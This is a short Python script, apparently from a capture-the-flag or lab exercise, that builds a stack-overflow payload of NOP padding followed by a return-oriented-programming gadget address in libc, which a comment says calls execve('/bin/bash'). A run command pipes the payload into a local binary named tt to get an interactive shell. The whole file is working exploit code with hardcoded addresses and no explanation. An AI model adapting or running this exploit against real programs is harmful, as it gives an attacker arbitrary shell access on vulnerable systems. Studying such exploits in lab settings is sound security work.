from struct import pack
nops = '\x90'
padding = '\x00\x00'
sys = pack('Q', 0x7ffff7dfcff0)
binsh = pack('Q', 0x7ffff7f39cee)
rop = pack('Q', 0xe666b + 0x7ffff7db6000) #0xe666b -> execve('/bin/bash', 0, 0), used one_gadget; 
ex = pack('Q', 0x7ffff7df2840)
payload = nops*40 + rop# + binsh + sys + ex
print(payload)
# TO RUN: (python payload.py;cat) | ./tt